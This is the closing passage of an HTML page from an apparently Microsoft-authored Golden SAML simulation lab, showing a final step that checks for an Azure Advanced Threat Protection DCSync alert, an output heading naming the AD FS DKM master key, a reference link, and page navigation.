<li><p>Go to <code class="docutils literal notranslate"><span class="pre">More</span> <span class="pre">Resources</span></code> and click on <code class="docutils literal notranslate"><span class="pre">Azure</span> <span class="pre">Advanced</span> <span class="pre">Threat</span> <span class="pre">Protection</span></code>.</p></li>
</ol>
<p><img alt="" src="../../../../_images/2021-05-19_26_m365_mdi_alert_dcsync.png" /></p>
</div>
</div>
</div>
<div class="section" id="output">
<h2>Output<a class="headerlink" href="#output" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>AD FS DKM Master Key</p></li>
</ul>
</div>
<div class="section" id="references">
<h2>References<a class="headerlink" href="#references" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p><a class="reference external" href="https://o365blog.com/post/adfs/">Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)</a></p></li>
</ul>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            kernelName: "python3",
            path: "./labs\GoldenSAML\simulation\export-adfs-dkm-key"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'python3'</script>

              </div>
              
            
                <!-- Previous / next buttons -->
<div class='prev-next-area'> 
    <a class='left-prev' id="prev-link" href="exportADFSDKMKeyLDAP.html" title="previous page">
        <i class="fas fa-angle-left"></i>
        <div class="prev-next-info">
            <p class="prev-next-subtitle">previous</p>
            <p class="prev-next-title">Export AD FS DKM Master Key via LDAP Queries</p>
        </div>
    </a>
    <a class='right-next' id="next-link" href="../export-adfs-certificates/README.html" title="next page">
    <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">Export AD FS Certificates</p>
    </div>
    <i class="fas fa-angle-right"></i>
    </a>
</div>
            
        </div>
    </div>
    <footer class="footer">
  <p>
    
      By Microsoft Corporation<br/>
    
        &copy; Copyright 2021.<br/>
  </p>
</footer>
</main>


      </div>
    </div>
  
  <script src="../../../../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>

  </body>
</html>